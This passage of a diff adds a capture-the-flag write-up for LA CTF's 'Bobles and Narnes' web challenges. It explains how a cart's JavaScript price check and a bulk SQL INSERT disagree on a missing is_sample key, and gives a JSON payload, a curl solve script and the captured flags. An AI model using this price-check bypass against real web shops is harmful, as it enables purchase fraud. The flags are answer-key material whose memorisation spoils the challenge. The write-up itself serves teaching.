+But here's the critical part: the price check runs on the **raw JavaScript objects** from `req.body.products`, *before* the INSERT. The JS filter uses `!+product.is_sample`, which reads the `is_sample` property directly from each object.
+
+So we have a mismatch:
+- **JS price check**: sees the raw `is_sample` value from user input (per object)
+- **Database INSERT**: only uses columns from the first object, dropping `is_sample` entirely if the first object doesn't have it
+
+---
+
+## The exploit
+
+Send two products in a single `/cart/add` request:
+
+```json
+{
+  "products": [
+    { "book_id": "a3e33c2505a19d18" },
+    { "book_id": "2a16e349fb9045fa", "is_sample": 1 }
+  ]
+}
+```
+
+The first product (Parliament, $10) has **no `is_sample` key**. The second product (Flag) has `is_sample: 1`.
+
+### What happens at add time (JS)
+
+The filter `.filter((product) => !+product.is_sample)` runs on each raw object:
+
+1. Parliament: `product.is_sample` is `undefined` (key missing). `+undefined = NaN`. `!NaN = true`. Kept as non-sample. Price = $10.
+2. Flag: `product.is_sample` is `1`. `+1 = 1`. `!1 = false`. Filtered out (treated as sample, not counted).
+
+`additionalSum = 10`. The balance check: `10 + null <= 1000`. Passes.
+
+### What happens at insert time (Bun SQL)
+
+`db()` sees the first object's keys: `{ book_id, username }`. No `is_sample`. The INSERT becomes:
+
+```sql
+INSERT INTO cart_items (book_id, username) VALUES ('a3e3...', 'me'), ('2a16...', 'me')
+```
+
+Both rows get `is_sample = NULL`.
+
+### What happens at checkout
+
+```js
+const path = item.is_sample ? book.file.replace(/\.([^.]+)$/, '_sample.$1') : book.file;
+```
+
+`item.is_sample` is `NULL`, which JavaScript reads as `null`. `null` is falsy. The ternary takes the else branch: `book.file = "flag.txt"`. We get the full flag file.
+
+The balance goes negative (`1000 - 1000010 = -999010`), but there's no check preventing that at checkout.
+
+---
+
+### Solve (bobles-and-narnes)
+
+```sh
+TARGET="https://bobles-and-narnes-XXXXX.instancer.lac.tf"
+USER="solve_$(date +%s)"
+
+# Register
+curl -s -c /tmp/cookies.txt -X POST "$TARGET/register" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=${USER}&password=pass"
+
+# Add flag to cart (first product missing is_sample key)
+curl -s -b /tmp/cookies.txt -X POST "$TARGET/cart/add" \
+  -H "Content-Type: application/json" \
+  -d '{"products": [{"book_id": "a3e33c2505a19d18"}, {"book_id": "2a16e349fb9045fa", "is_sample": 1}]}'
+
+# Checkout and extract flag
+curl -s -b /tmp/cookies.txt -X POST "$TARGET/cart/checkout" -o /tmp/solve.zip
+unzip -p /tmp/solve.zip flag.txt
+```
+
+---
+
+## Flags
+
+Narnes and Bobles:
+```
+lactf{matcha_dubai_chocolate_labubu}
+```
+
+Bobles and Narnes:
+```
+lactf{hojicha_chocolate_dubai_labubu}
+```
